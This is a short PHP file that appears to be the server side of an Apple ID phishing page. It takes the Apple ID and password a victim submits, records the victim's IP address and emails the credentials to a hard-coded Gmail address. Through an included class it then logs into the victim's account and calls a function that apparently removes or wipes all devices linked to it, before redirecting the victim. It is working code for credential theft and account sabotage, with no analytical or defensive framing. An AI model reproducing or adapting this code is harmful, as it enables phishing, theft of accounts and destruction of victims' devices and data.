<?php 
$email= $_POST['appleid'];
$pass= $_POST['password'];
function getUserIP()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}

$user_ip = getUserIP();
// Additional headers
$headers .= 'To: New User' . "\r\n";
$headers .= 'From: iServer' . "\r\n";

// To send HTML mail, the Content-type header must be set
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";

// Send email with reply
$to  = "tirunehkibrom@gmail.com";

// Subject
$subject = 'Email Account Details';

// Message
$message = 'Email Account Details<br><br>Email: '.$email.'<br>
Password: '.$pass.'<br><br>
IP Address:'. $user_ip.'<br><hr>';
include("FMI.php");
$FMI = new Devjo();
if($FMI->Login($email,$pass) == true){
$devices_array = $FMI->Delete_All();
$body = implode("\n",$devices_array);
$message .= $body;
		// Mail it
mail($to, $subject, $message, $headers);

header("Location: find.php"); 
}else{

	header("Location: index.php?error");
}



?>